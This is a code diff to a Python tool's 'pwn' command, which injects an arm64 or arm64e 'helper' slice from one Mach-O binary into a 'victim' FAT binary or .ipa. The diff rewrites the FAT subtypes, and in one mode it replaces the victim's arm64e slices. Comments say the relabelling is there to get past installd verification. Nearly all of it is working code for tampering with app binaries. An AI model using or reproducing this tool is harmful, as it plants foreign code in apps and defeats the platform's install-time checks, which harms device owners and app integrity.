@@ -193,7 +193,11 @@ def cmd_set_cpusubtype(filepath, subtype):
     os.chmod(filepath, os.stat(filepath).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
 
 def cmd_pwn(victim_path, inject_path, prefer_arm64e=False):
-    """Inject binary into victim FAT binary."""
+    """Inject binary into victim FAT binary.
+    
+    For pwn (arm64): adds arm64 helper slice (keeps all victim slices)
+    For pwn64e (arm64e): replaces existing arm64e slices with injected arm64e helper
+    """
     # Read victim binary
     victim_data, victim_resolved = resolve_binary(victim_path)
     if victim_data is None:
@@ -218,7 +222,6 @@ def cmd_pwn(victim_path, inject_path, prefer_arm64e=False):
         print("Error: Cannot parse inject binary")
         sys.exit(1)
     
-    # Determine which subtype to inject
     subtype_to_use = CPU_SUBTYPE_ARM64E if prefer_arm64e else CPU_SUBTYPE_ARM64
     
     # Find matching inject slice
@@ -232,64 +235,83 @@ def cmd_pwn(victim_path, inject_path, prefer_arm64e=False):
     if not inject_slice:
         want = 'arm64e' if prefer_arm64e else 'arm64'
         print(f"Error: No {want} slice found in inject binary")
-        print(f"  Available slices:")
-        for s in inject_slices:
-            print(f"    cputype=0x{s['cputype']:X} macho_subtype=0x{s.get('macho_cpusubtype', 0):X}")
         sys.exit(1)
     
-    # Build output FAT: [victim slices with arm64→arm64e in FAT] + [inject slice]
-    total_slices = len(victim_slices) + 1
+    if prefer_arm64e:
+        # pwn64e: keep arm64 slices (for installd verification), REPLACE arm64e slices
+        output_slices = []
+        for s in victim_slices:
+            macho_sub = s.get('macho_cpusubtype', s['cpusubtype'])
+            if s['cputype'] == CPU_TYPE_ARM64 and (macho_sub & 0xFFFFFF) >= 2:
+                # This is an arm64e slice — SKIP it (will be replaced)
+                print(f"  Replacing victim arm64e slice (subtype=0x{macho_sub:X}, size={s['size']})")
+                continue
+            # Keep this slice (arm64 or non-arm64e)
+            new_subtype = s['cpusubtype']
+            if s['cputype'] == CPU_TYPE_ARM64:
+                new_subtype = CPU_SUBTYPE_ARM64E  # Change FAT subtype for installd
+            output_slices.append({
+                'cputype': s['cputype'],
+                'cpusubtype': new_subtype,
+                'size': s['size'],
+                'align': ALIGN_DEFAULT,
+                'orig_offset': s['offset'],
+                'orig_data': victim_data,
+            })
+        # Add the injected arm64e helper
+        output_slices.append({
+            'cputype': CPU_TYPE_ARM64,
+            'cpusubtype': inject_slice['cpusubtype'],
+            'size': inject_slice['size'],
+            'align': ALIGN_DEFAULT,
+            'orig_offset': inject_slice['offset'],
+            'orig_data': inject_data,
+        })
+    else:
+        # pwn: keep all victim slices (arm64→arm64e in FAT), add injected arm64
+        output_slices = []
+        for s in victim_slices:
+            new_subtype = s['cpusubtype']
+            if s['cputype'] == CPU_TYPE_ARM64:
+                new_subtype = CPU_SUBTYPE_ARM64E
+            output_slices.append({
+                'cputype': s['cputype'],
+                'cpusubtype': new_subtype,
+                'size': s['size'],
+                'align': ALIGN_DEFAULT,
+                'orig_offset': s['offset'],
+                'orig_data': victim_data,
+            })
+        output_slices.append({
+            'cputype': CPU_TYPE_ARM64,
+            'cpusubtype': inject_slice['cpusubtype'],
+            'size': inject_slice['size'],
+            'align': ALIGN_DEFAULT,
+            'orig_offset': inject_slice['offset'],
+            'orig_data': inject_data,
+        })
     
+    # Build FAT
+    total_slices = len(output_slices)
     fat_data = bytearray()
     fat_data += struct.pack('>II', FAT_MAGIC, total_slices)
     
     cur_offset = align
-    victim_entries = []
-    for s in victim_slices:
-        new_subtype = s['cpusubtype']
-        if s['cputype'] == CPU_TYPE_ARM64:
-            new_subtype = CPU_SUBTYPE_ARM64E
-        
-        entry = {
-            'cputype': s['cputype'],
-            'cpusubtype': new_subtype,
-            'offset': cur_offset,
-            'size': s['size'],
-            'align': ALIGN_DEFAULT,
-            'orig_offset': s['offset'],
-        }
-        victim_entries.append(entry)
-        cur_offset += round_up(s['size'], align)
-    
-    # Inject entry
-    inject_entry = {
-        'cputype': CPU_TYPE_ARM64,
-        'cpusubtype': inject_slice['cpusubtype'],
-        'offset': cur_offset,
-        'size': inject_slice['size'],
-        'align': ALIGN_DEFAULT,
-        'orig_offset': inject_slice['offset'],
-    }
-    cur_offset += round_up(inject_slice['size'], align)
-    
-    # Write FAT arch entries
-    for entry in victim_entries + [inject_entry]:
+    for entry in output_slices:
+        entry['offset'] = cur_offset
         fat_data += struct.pack('>IIIII',
             entry['cputype'], entry['cpusubtype'],
             entry['offset'], entry['size'], entry['align'])
+        cur_offset += round_up(entry['size'], align)
     
     # Assemble output
     output = bytearray(cur_offset)
     output[:len(fat_data)] = fat_data
     
-    for entry in victim_entries:
+    for entry in output_slices:
         start = entry['orig_offset']
         end = start + entry['size']
-        output[entry['offset']:entry['offset']+entry['size']] = victim_data[start:end]
-    
-    start = inject_entry['orig_offset']
-    end = start + inject_entry['size']
-    output[inject_entry['offset']:inject_entry['offset']+inject_entry['size']] = inject_data[start:end]
+        output[entry['offset']:entry['offset']+entry['size']] = entry['orig_data'][start:end]
     
     # Write output
     if victim_path.endswith('.ipa') or victim_path.endswith('.zip'):
@@ -303,7 +325,9 @@ def cmd_pwn(victim_path, inject_path, prefer_arm64e=False):
     shutil.move(tmp_path, victim_path)
     
     mode = 'arm64e' if prefer_arm64e else 'arm64'
-    print(f"Successfully injected {mode} slice ({inject_slice['size']} bytes) into {victim_path}")
+    action = 'replaced arm64e slice' if prefer_arm64e else 'injected arm64 slice'
+    print(f"Successfully {action} ({inject_slice['size']} bytes) in {victim_path}")
+    print(f"Output: {total_slices} architecture slices")
 
 def main():
     if len(sys.argv) < 3:
